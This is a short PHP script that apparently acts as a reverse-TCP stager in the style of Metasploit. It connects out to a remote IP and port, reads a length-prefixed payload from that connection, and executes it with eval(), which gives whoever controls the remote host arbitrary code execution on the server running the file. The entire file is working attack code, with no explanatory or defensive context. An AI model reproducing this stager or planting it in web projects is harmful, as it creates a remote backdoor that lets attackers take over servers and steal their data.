<?php
$msgsock_type = 'stream';
$msgsock = @stream_socket_client("tcp://{$ipaddr}:{$port}");
$len = fread($msgsock, 4);

$a = unpack("Nlen", $len);
$len = $a['len'];
$buffer = '';
while (strlen($buffer) < $len) 
{
	switch ($msgsock_type) 
	{ 
		case 'stream': 
			$buffer .= fread($msgsock, $len-strlen($buffer)); 
			break;
		case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));
			break;
	}
}
eval($buffer);
echo "[*] Connection Terminated";
?>